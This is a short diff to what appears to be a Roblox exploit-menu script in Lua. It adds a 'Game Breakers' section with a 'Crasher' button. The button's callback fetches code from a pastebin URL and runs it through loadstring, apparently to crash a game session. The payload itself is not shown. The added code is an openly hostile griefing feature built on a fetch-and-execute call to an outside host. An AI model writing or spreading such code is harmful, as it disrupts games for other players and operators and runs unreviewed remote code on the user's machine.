@@ -125,6 +125,17 @@ MainTab:AddButton({
   	end    
 })
 
+-- Game Breakers --
+
+MainTab:AddLabel("Game Breakers")
+
+MainTab:AddButton({
+	Name = "Crasher (At least 1 piece of layered clothing on)",
+	Callback = function()
+      		 loadstring(game:HttpGet("https://pastebin.com/raw/CyVQ0zNG",true)) ()
+  	end    
+})
+
 -- Setings tab --
 
 local SettingsTab = MainWindow:MakeTab({
